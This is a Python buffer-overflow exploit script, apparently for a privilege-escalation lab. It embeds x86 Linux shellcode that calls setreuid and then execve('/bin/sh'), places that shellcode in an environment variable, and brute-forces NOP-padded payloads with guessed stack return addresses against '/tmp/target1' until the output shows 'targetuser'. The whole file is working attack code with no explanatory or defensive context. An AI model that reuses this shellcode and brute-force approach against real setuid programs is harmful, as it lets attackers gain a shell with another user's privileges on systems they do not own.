import subprocess
import struct

shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

def run_exploit(offset, addr):
    print(f"[*] Trying offset: {offset}, address: {hex(addr)}")
    
    # Construct the payload
    payload = offset * b"\x90" + struct.pack("<I", addr)
    
    # Write the payload to a file
    with open("payload", "wb") as f:
        f.write(payload)
    
    # Run the target program with the payload
    p = subprocess.Popen(["/tmp/target1", payload], env={"SHELLCODE": shellcode}, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = p.communicate()
    
    # Check if the exploit was successful
    if b"targetuser" in output:
        print(f"[+] Exploit succeeded with offset: {offset}, address: {hex(addr)}")
        print(output.decode())
        return True
    
    return False

def brute_force():
    # Define the range of offsets and addresses to test
    offset_range = range(0, 100, 4)
    addr_range = range(0xbffff000, 0xc0000000, 0x1000)
    
    for offset in offset_range:
        for addr in addr_range:
            if run_exploit(offset, addr):
                return
    
    print("[-] Exploit failed")

if __name__ == "__main__":
    brute_force()